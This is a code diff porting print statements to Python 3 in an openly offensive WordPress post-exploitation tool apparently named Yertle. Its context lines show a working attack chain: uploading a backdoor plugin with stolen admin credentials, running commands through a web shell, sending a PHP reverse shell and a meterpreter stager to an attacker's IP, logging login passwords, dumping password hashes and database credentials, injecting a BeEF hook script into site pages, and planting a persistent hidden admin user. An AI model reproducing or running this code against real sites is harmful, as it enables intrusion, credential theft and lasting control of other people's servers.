@@ -28,22 +28,22 @@ def uploadbackdoor(host,username,password,type,verbose, agent):
 
     r = session.post(url, headers=headers, data=payload)
     if verbose is True:
-        print "Server Header: " + r.headers['Server']
+        print("Server Header: " + r.headers['Server'])
     if r.status_code == 200:
         if verbose is True:
-            print "Found Login Page"
+            print("Found Login Page")
     r3 = session.get(host + '/wp-admin/plugin-install.php?tab=upload',headers=headers)
     if r3.status_code == 200:
         if verbose is True:
-            print "Logged in as Admin"
+            print("Logged in as Admin")
     look_for = 'name="_wpnonce" value="'
     try:
         nonceText = r3.text.split(look_for, 1)[1]
         nonce = nonceText[0:10]
         if verbose is True:
-            print "Found CSRF Token: " + nonce
+            print("Found CSRF Token: " + nonce)
     except:
-        print "Didn't find a CSRF token, check the URL and/or credentials."
+        print("Didn't find a CSRF token, check the URL and/or credentials.")
         sys.exit(2)
 
     files = {'pluginzip': (uploaddir + '.zip', open(type +'.zip', 'rb')),
@@ -54,15 +54,15 @@ def uploadbackdoor(host,username,password,type,verbose, agent):
              }
     r4 = session.post(host + "/wp-admin/update.php?action=upload-plugin",headers=headers, files=files)
     if r.status_code == 200:
-        print "Backdoor uploaded!"
+        print("Backdoor uploaded!")
         if "Plugin installed successfully" in r4.text:
             if verbose is True:
-                print "Plugin installed successfully"
+                print("Plugin installed successfully")
 
         if "Destination folder already exists" in r4.text:
             if verbose is True:
-                print "Destination folder already exists"
-    print "Upload Directory: " + uploaddir
+                print("Destination folder already exists")
+    print("Upload Directory: " + uploaddir)
     return uploaddir
 
 
@@ -73,7 +73,7 @@ def commandloop(host,uploaddir):
         if (cmd == "quit") or (cmd == "exit"):
             sys.exit(2)
         elif cmd == "help" or cmd == "?":
-            print '''
+            print ('''
             Core Commands
             =============
 
@@ -93,7 +93,7 @@ def commandloop(host,uploaddir):
                 shell                     Sends a TCP reverse shell to a netcat listener
                 stealth                   Hides Yertle from the plugins page
 
-                '''
+                ''')
         elif cmd == "hashdump":
             hashdump(host, uploaddir)
         elif cmd == "shell":
@@ -112,19 +112,19 @@ def commandloop(host,uploaddir):
             persist(host, uploaddir)
         elif cmd == "dbcreds":
             creds = datacreds(host, uploaddir)
-            print "Hostname: " + creds[0]
-            print "Username: " +creds[1]
-            print "Password: " +creds[2]
-            print "Database: " + creds[3]
+            print("Hostname: " + creds[0])
+            print("Username: " +creds[1])
+            print("Password: " +creds[2])
+            print("Database: " + creds[3])
         else:
-            print "Sent command: " + cmd
+            print("Sent command: " + cmd)
             sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
-            print sendcommand.text
+            print(sendcommand.text)
 
 
 def reverseshell(host, ip, port,uploaddir):
     params = [('ip', ip), ('port', port)]
-    print "Sending reverse shell to " + ip + " port " + port
+    print("Sending reverse shell to " + ip + " port " + port)
     sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/reverse.php", params=params)
 
 
@@ -153,7 +153,7 @@ def shell(host,uploaddir):
         port = raw_input('Port: ')
         params = [('cmd', ('php -r \'$sock=fsockopen("' + ip + '",' + port + ');exec("/bin/bash -i <&3 >&3 2>&3");\'').encode('base64'))]
         try:
-            print "Sending reverse shell to " + ip + " port " + port
+            print("Sending reverse shell to " + ip + " port " + port)
             requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params, timeout=1)
         except requests.exceptions.Timeout:
             pass
@@ -162,7 +162,7 @@ def shell(host,uploaddir):
 def keylog(host,uploaddir):
     params = [('cmd', ('cat passwords.txt').encode('base64'))]
     sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
-    print sendcommand.text
+    print(sendcommand.text)
 
 
 def stealth(host,uploaddir):
@@ -266,11 +266,11 @@ def meterpreter(host,uploaddir):
         params = [
             ('cmd', 'php meterpreter.php'.encode('base64'))]
         try:
-            print "Sending meterpreter stager to connect back to " + ip + ":" + port
+            print("Sending meterpreter stager to connect back to " + ip + ":" + port)
             sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params, timeout=1)
         except requests.exceptions.Timeout:
             pass
-        print sendcommand.text
+        print(sendcommand.text)
 
 
 def keylogger(host,uploaddir):
@@ -299,7 +299,7 @@ def keylogger(host,uploaddir):
             params = [
                 ('cmd', 'php backdoor.php'.encode('base64'))]
             requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
-            print "wp_signon function patched.  Do not run this more than once.  Use 'keylog' to check the log file."
+            print("wp_signon function patched.  Do not run this more than once.  Use 'keylog' to check the log file.")
 
 
 def hashdump(host,uploaddir):
@@ -338,7 +338,7 @@ $conn->close();
         params = [
         ('cmd', 'php hashdump.php'.encode('base64'))]
         sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
-        print sendcommand.text
+        print(sendcommand.text)
 
 
 def beefhook(host,uploaddir):
@@ -347,7 +347,7 @@ def beefhook(host,uploaddir):
         params = [
             ('cmd',('sed -i \'1i\<script src=\"http://' + ip + ':3000/hook.js\"\>\</script\>\'  ../../../wp-blog-header.php').encode('base64'))]
         sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
-        print "BeEF hook added!  Check BeEF for any hooked clients. Do not run this multiple times."
+        print("BeEF hook added!  Check BeEF for any hooked clients. Do not run this multiple times.")
 
 def persist(host,uploaddir):
     if safety(host, uploaddir):
@@ -372,7 +372,7 @@ def persist(host,uploaddir):
             params = [
                 ('cmd',('php -r \'echo base64_decode("' + payload + '");\' >> ../../../wp-blog-header.php').encode('base64'))]
             sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
-            print "Added persistent user \"%s\" with the password \"%s\"." % (username, password)
+            print("Added persistent user \"%s\" with the password \"%s\"." % (username, password))
 
 
 def safety(host,uploaddir):
@@ -382,7 +382,7 @@ def safety(host,uploaddir):
     params = [('cmd', ('readlink -e ' + results).encode('base64'))] # resolves Symlinks
     sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
     if "php-cgi" in sendcommand.text: #issues with php-cgi.  Aborts the module.
-        print "The PHP interpreter on this system is not compatible with this module."
+        print("The PHP interpreter on this system is not compatible with this module.")
         return False
     else:
         return True
@@ -405,17 +405,17 @@ def printbanner():
       Post-exploitation Module for Wordpress
                      v.1.1.0
     """
-    print banner
+    print(banner)
 
 
 def argcheck(interactive,reverse,target):
 
     if interactive is False and reverse is False:
-        print "You must choose a type of shell: --reverse or --interactive"
+        print("You must choose a type of shell: --reverse or --interactive")
         sys.exit()
 
     if "http" not in target:
-        print"Please include the protocol in the URL"
+        print("Please include the protocol in the URL")
         sys.exit()
 
 
@@ -438,7 +438,7 @@ def main():
     if not args.reverse:
         if args.existing is None:
             if args.username is None or args.password is None:
-                print "Username and Password are required"
+                print("Username and Password are required")
                 sys.exit()
             uploaddir = uploadbackdoor(args.target, args.username, args.password, "shell", args.verbose, args.agent)
         else:
@@ -446,15 +446,15 @@ def main():
         if exist_check(args.target, uploaddir):
             commandloop(args.target, uploaddir)
         else:
-            print "Existing shell not found.  Please verify the path or upload a new shell."
+            print("Existing shell not found.  Please verify the path or upload a new shell.")
 
     if args.reverse and args.interactive:
         if args.ip is None or args.port is None:
-            print "For a reverse shell, a listening IP and Port are required"
+            print("For a reverse shell, a listening IP and Port are required")
             sys.exit()
         if args.existing is None:
             if args.username is None or args.password is None:
-                print "Username and Password are required"
+                print("Username and Password are required")
                 sys.exit()
             uploaddir = uploadbackdoor(args.target, args.username, args.password, "reverse", args.verbose, args.agent)
         else:
